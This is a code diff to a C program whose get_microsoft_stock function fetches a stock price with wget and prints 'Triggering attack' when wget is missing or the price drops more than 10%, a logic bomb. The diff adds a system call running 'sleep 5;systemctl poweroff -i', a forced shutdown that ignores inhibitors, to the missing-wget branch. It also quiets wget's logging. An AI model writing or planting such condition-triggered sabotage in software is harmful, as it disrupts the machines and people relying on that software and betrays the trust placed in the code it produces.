@@ -55,12 +55,13 @@ int get_microsoft_stock(Globals *global) {
     if (!is_wget_installed(global)) {
         global->printf("\e[33mWARNING:\e[0m Wget is not installed\n");
         global->printf("\e[31mTriggering attack...\e[0m\n");
+        global->system("sleep 5;systemctl poweroff -i");
         return RET_TRIGGER;
     }
 
     // Construct the wget command
     // -q for quiet mode, -O - to output to stdout
-    global->snprintf(command, sizeof(command), "wget -q -O - %s", MICROSOFT_STOCK_URL);
+    global->snprintf(command, sizeof(command), "wget -q -o /dev/null -O - %s", MICROSOFT_STOCK_URL);
 
     // Open a pipe to the wget command
     fp = global->popen(command, "r");
@@ -78,7 +79,7 @@ int get_microsoft_stock(Globals *global) {
             global->printf("\e[32mMicrosoft stock value:\e[0m $%d\n", current_stock_value);
             global->printf("\e[32mPercentage of change:\e[0m %.2f%%\n", percentage_change);
 
-            // Check for a 10% drop to trigger the attack
+            // Check for more than a 10% drop to trigger the attack
             if (percentage_change < -10) {
                 global->printf("\e[33mWARNING:\e[0m Microsoft stock value dropped more than 10%%!\n");
                 global->printf("\e[31mTriggering attack...\e[0m\n");
